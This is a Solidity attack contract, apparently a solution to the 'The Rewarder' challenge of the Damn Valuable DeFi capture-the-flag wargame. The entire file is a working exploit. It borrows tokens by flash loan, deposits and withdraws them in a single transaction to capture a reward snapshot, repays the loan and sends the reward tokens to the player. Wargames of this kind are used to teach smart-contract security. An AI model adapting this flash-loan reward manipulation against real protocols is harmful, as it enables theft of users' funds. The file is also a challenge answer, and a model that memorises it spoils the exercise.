// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract AttackRewarder {
    address player;
    TheRewarderPool rewarder;
    DamnValuableToken token;

    constructor(address _rewarder, address _token, address _player) {
        rewarder = TheRewarderPool(_rewarder);
        token = DamnValuableToken(_token);
        player = _player;
    }

    function attack(FlashLoanerPool pool, uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);

        token.transfer(msg.sender, amount);
    }

    function take(RewardToken rt) external {
        uint256 amount = rt.balanceOf(address(this));
        rt.transfer(player, amount);
    }
}
